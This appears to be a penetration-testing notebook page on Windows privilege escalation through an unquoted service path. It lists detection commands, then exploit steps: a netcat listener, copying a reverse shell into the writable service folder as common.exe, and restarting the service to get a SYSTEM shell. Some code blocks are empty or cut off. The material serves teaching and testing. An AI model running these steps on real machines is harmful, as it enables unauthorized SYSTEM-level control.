# Manual

Unquoted service path that is a binary path doesn't contain the quotes (") to treats it as an absolute path which can make the service to be mislead to a malicious binary process when it's possible to override the service.

## 01 - Detect

### 1.1 - Command Prompt

```
C:\> wmic service get name,startname,pathname,startmode | findstr /i localsystem | findstr /i /v "c:\windows" | findstr /i /v """
AWSLiteAgent                              C:\Program Files\Amazon\XenTools\LiteAgent.exe                                     Auto       LocalSystem                  
unquotedsvc                               C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe        Manual     LocalSystem                  
winexesvc                                 winexesvc.exe                                                                      Manual     LocalSystem
```

As I have previously explained from the [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/04 - Privilege Escalation/Windows/Local Privilege Escalation/Service Exploits/Insecure Service Permission/Manual|Insecure Service Paths]] section after the discovering the services. There isn't much to say to further confirm it that contains the previous to further verify it's vulnerable but to the **Unquoted Service Path** and the realistic scenario it might not be accessible to the **Users** group to `start` or `stop` the service via `sc.exe` or `net.exe` if it does not have the **BUILTIN\\Users:(I)(RX)** permissions except that it might have either **full access `(BUILTIN\Users:(F)` or `BUILTIN\Users:(I)(F))` or **write access `(BUILTIN\Users:(W)` or `BUILTIN\Users:(I)(W))`**.

This is what it looks like to grant write access for the **Users** group with the following command:

```
C:\> icacls "C:\Program Files\Service name\service.exe" /grant "BUILTIN\Users":W
processed file: C:\Program Files\Service name\service.exe
Succesfully processed 1 files; Failed processing 0 files
```

So what you should look out is that the **Unquoted Service Path** that it is configured to **Auto** start the service that the computer needed to be rebooted as I explained on the previous privilege escalation technique.

```
C:\> sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

After running the `icacls` command the surprising thing of what it stands out that we have full access permission that displays with **BUILTIN\\Users:(F)** meaning the attacker can copy the malware and insert into that particular folder to execute it.

```
C:\> icacls "C:\Program Files\Unquoted Path Service"

### 1.2 - Powershell

```
PS C:\> Get-WMIObject -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

PS C:\> Get-CimInstance -ClassName Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object PathName,DisplayName,Name
```

```
PS C:\> get-service unquotedsvc | format-list

CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32OwnProcess
```

When running the powershell cmdlet we have `BUILTIN\Users Allow FullControl` indicates that the users have full access in other words the attacker can copy the malware and insert into that particular folder to execute it

```

```

Of course in order to verify even further to use it as future reference. When running with accesschk.exe we can see **RW BUILTIN\\Users** group that contains two letters and they are **R for read** and **W for write**. It is confirmed we can hijack this **Unquoted Service Path** without including the quotes and it will lead right back to our reverse shell with a suitable in order for this service to recognize it.

```
C:\> accesschk.exe -accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

## 02 - Exploit

Let's copy our reverse shell directly to the folder. You may notice that I've typed it without the capitals. During the MS DOS era, Windows operating systems can read the letters case insensitive. Also if you look closely about the reverse that was copied and renamed as `common.exe` that is because it is "unquoted" service the service will not execute the absolute path `C:\Program Files\Unquoted Path Service\Common Files\`. This will make Windows to accept the bogus program and run it anyways.

`$ sudo nc -lnvp 53`

- In command prompt

```
C:\> copy shell.exe "c:\program files\unquoted path service\common.exe"

C:\> sc stop unquotedsvc

C:\> sc start unquotedsvc
```

- In powershell

```
PS C:\> copy-item shell.exe "c:\program files\unquoted path service\common.exe"

PS C:\> Stop-Service unquotedsvc

PS C:\> Start-Service unquotedsvc
```

```
$ sudo nc -lnvp 53

C:\Windows\system32> whoami
nt authority\system
```

## 03 - Cleanup

Let's remove our reverse shell after we are done with the post exploitation phase.

`C:\Windows\system32> del "c:\program files\unquoted path service\common.exe"`
